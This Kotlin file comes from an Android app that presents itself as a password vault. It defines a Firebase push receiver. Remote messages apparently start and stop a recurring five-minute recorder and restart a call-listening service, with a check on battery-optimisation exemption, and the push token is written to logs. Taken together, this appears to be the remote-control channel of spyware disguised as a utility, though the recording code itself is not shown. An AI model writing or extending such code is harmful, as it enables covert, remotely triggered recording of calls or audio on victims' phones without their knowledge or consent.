package com.example.passwordvault.service

import android.content.Context
import android.os.Build
import android.os.PowerManager
import android.util.Log
import com.example.passwordvault.util.PreferenceUtil
import com.example.passwordvault.util.Scheduler
import com.example.passwordvault.util.logger.log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage


private val tag = FCMReceiver::class.java.simpleName

class FCMReceiver : FirebaseMessagingService() {

    override fun onNewToken(newToken: String) {
        PreferenceUtil.writeAccessToken(applicationContext, newToken)
        log(tag, "FCM::Token -> $newToken")
    }

    override fun onMessageReceived(msg: RemoteMessage) {
        val status = msg.data["status"]
        Log.e(tag, "FCM status -> $status")

        when (status) {
            "restartservice" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val packageName = packageName
                    val pm =
                        getSystemService(Context.POWER_SERVICE) as PowerManager
                    if (!pm.isIgnoringBatteryOptimizations(packageName))
                        Scheduler.wakeUpCallReceiver(applicationContext)
                    else
                        Scheduler.scheduleCallServiceListener(applicationContext)
                }
            }

            "start" -> Scheduler.schedule5minRecorder(applicationContext)
            "stop" -> Scheduler.cancel5minRecorder(applicationContext)
            else -> Log.e(tag, "Unrecognized FCM status")
        }
    }

    override fun onSendError(p0: String, p1: Exception) {
        super.onSendError(p0, p1)
    }

    override fun onMessageSent(p0: String) {
        super.onMessageSent(p0)
    }

}
